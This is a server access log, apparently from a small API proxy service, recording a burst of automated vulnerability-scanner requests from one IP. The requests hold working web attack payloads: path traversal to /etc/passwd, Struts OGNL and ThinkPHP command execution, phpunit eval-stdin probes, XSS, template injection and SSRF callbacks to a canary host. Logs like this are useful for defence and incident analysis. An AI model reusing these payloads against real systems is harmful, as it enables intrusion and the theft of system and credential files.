2026-02-20 15:59:25,364 [INFO] 目标地址  : https://dashscope.aliyuncs.com/compatible-mode/v1
INFO:     3.211.106.148:36652 - "GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|https://ssrfcanary.com/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /%28S%28x%29%29/b/%28S%28x%29%29in/Unity.dll HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /webjars/swagger-ui/2.1.0-M1/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /swagger-ui.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /metrics/v1/mbeans HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /index.php?option=com_jotloader&section=../../../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /wp-content/themes/enfold-child/error_log HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "POST / HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /sessionlist.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /bugs?o=@ssrfcanary.com%23&p=def HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /bower.json HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /cgi-bin/ciwweb.pl?hid_javascript=1&hid_Random_ACARAT=%5B%2571337**2%25%5D&hid_Random_ACARAT=x HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /webjars/swagger-ui/3.20.5/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /routes/configs/routes.ini HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /index.php?option=com_powermail&controller=../../../../../../../../../../etc/passwd%00 HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /includes/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /error_testing_phalcon HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /artifactory/api/access/api/v1/users/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "POST /sites/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /irj/usage1.jsp?cmd=ls HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /.user.ini HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /npm-debug.log HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "POST /aspera/faspex/package_relay/relay_package HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /ruby/config/storage.yml HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /build.sh HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /.phpci.yml HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "POST /_staff/cron/php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /bin/wcm/search/gql.json/a.1.json%3Bx%3D%27.css/x%27?query=type:base%20limit:..1&pathPrefix= HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /config.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "POST /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /usr/share/dpkg/sh/dpkg-error.sh%3F/x/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /admin-app/.env HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /soap.svc HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /js/../etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /log/mobile.log HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "POST /actions/authenticate.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /index.action?action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','cat','/etc/passwd'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "POST /support/aura HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /management/heapdump HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /rest/aisresources/sysconf.jsp HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /login/login.fcc?sm=%0d%0aprompt(origin)// HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /actuator/dump HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /wp-config.php.backup HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /graph HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "POST /modules/ps_facetedsearch/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /%2BCSCOU%2B//../%2BCSCOE%2B/files/file_action.html?mode=upload&path=foo&server=srv&sourceurl=qaz HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /invoke/sample.xslt/transformToString HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /struts/utils.js HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /adminer.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /phpmyadmin/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/ HTTP/1.1" 404 Not Found
INFO:     3.211.106.148:36668 - "GET /?/../../../../../../../../../../../../windows/win.ini HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "POST //CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /anpoc12141213.jsp HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /webjars/swagger-ui/4.15.5/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /Thumbs.db HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /SAAS/auth/login HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "POST /?q=node&destination=node HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /invoke/sample.xslt/transformToString HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /api/v3/doc HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /wiki/pages/doenterpagevariables.action?queryString=HTTPVOID%5cu0027%2b%23%7b333*3%7d%2b%5cu0027 HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /overview HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /wp-content/plugins/adaptive-images/adaptive-images-script.php/%3Cimg/src/onerror%3Dalert%28document.domain%29%3E/?debug=true HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /browser/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "POST /setup/setupadministrator.action HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /webjars/swagger-ui/3.13.6/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /webjars/swagger-ui/3.12.0/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /v1/AWSInstanceCheck/../version HTTP/1.1" 200 OK
INFO:     3.211.106.148:39194 - "GET /ads/www/delivery/lg.php?dest=http://example.com HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /index.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','cat','/etc/passwd'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /alps/profile HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /tagebuch/eintraege/index.html?reloaded&page=1">%3Cscript%3Ealert(document.domain)%3c%2fscript%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /phpmyadmin/setup/index.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /learn/cubemail/filemanagement.php?action=dl&f=../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "POST /ZMC_Admin_Login HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/v3/doc HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /pages/createpage-entervariables.action?queryString=HTTPVOID%5cu0027%2b%23%7b333*3%7d%2b%5cu0027 HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /api/Image/withpath/C%3A%5CWindows%5Cwin.ini HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /index.php?option=com_kp&controller=../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /AsiCommon/Controls/ContentManagement/ContentDesigner/Telerik.Web.UI.DialogHandler.aspx HTTP/1.1" 200 OK
INFO:     3.211.106.148:46544 - "GET /api/experimental/dags/example_trigger_target_dag/tasks/bash_task HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /nette.micro/?callback=shell_exec&cmd=cat%20/etc/passwd&what=-1 HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /artifactory/api/access/api/v1/users/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /api/v1/api-docs HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /Telerik.Web.UI.DialogHandler.aspx HTTP/1.1" 200 OK
INFO:     3.211.106.148:46544 - "GET /goanywhere/license/Unlicensed.xhtml/an?javax.faces.ViewState=an&GARequestAction=activate HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /go/add-on/business-continuity/api/cruise_config HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "POST /wp-content/wp-plugins/wptimetoread/vendor/kdaviesnz/timetoread/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/iframe?url=https://mgaryanote.tumblr.com/?xss&api_key=3908f7948e918571f48dda&iframe=pew HTTP/1.1" 200 OK
INFO:     3.211.106.148:36670 - "GET /Tracking/RunUrl.aspx?Ref=https://example.com HTTP/1.1" 200 OK
INFO:     3.211.106.148:36668 - "GET /docs/3.0/overview?x=aijsy{{1337**2}}epalq HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/experimental/dags/example_trigger_target_dag/tasks/bash_task HTTP/1.1" 200 OK
INFO:     3.211.106.148:36652 - "GET /?a+--env=! HTTP/1.1" 200 OK
INFO:     3.211.106.148:46544 - "GET /openx2/www/delivery/al.php?zoneid=1&layerstyle=geocities&closetext=<script>alert(123);</script> HTTP/1.1" 200 OK
INFO:     3.211.106.148:51876 - "GET /webjars/swagger-ui/3.18.1/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/Image/withpath/C%3A%5CWindows%5Cwin.ini HTTP/1.1" 200 OK
